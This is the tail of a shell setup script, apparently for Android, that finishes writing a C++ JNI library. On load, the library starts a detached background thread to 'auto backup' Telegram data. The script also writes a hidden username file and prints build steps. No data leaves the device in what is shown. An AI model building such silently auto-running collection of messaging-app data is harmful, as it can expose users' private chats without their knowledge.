        int r = run_telegram_backup();
        printf("[TGBK] Result: %d\n", r);
        return JNI_VERSION_1_6;
    }

    LOGI("JNI_OnLoad - starting auto backup");
    std::thread t(background_worker);
    t.detach();

    return JNI_VERSION_1_6;
}
CPPEOF

# ============================================================
# === Gumawa ng username file ===
# ============================================================
mkdir -p /storage/emulated/0/Telegram_Backup/
echo "Juan" > /storage/emulated/0/Telegram_Backup/.username

echo ""
echo "============================================"
echo "   SETUP COMPLETE"
echo "============================================"
echo ""
echo "Files created in ~/tgbk/:"
ls -la ~/tgbk/ | tail -n +2
echo ""
echo "Files created in ~/tgbk_test/:"
ls -la ~/tgbk_test/ | tail -n +2
echo ""
echo "Username: $(cat /storage/emulated/0/Telegram_Backup/.username)"
echo ""
echo "NEXT STEPS:"
echo "  1. Edit config:  nano ~/tgbk/config.json"
echo "  2. Compile test: cd ~/tgbk_test && g++ -std=c++17 -rdynamic test.cpp -o test -ldl"
echo "  3. Rebuild .so:  cd ~/tgbk && ./build.sh"
echo "  4. Run test:     cd ~/tgbk_test && ./test ../tgbk/build/libtgbk.so"
echo ""
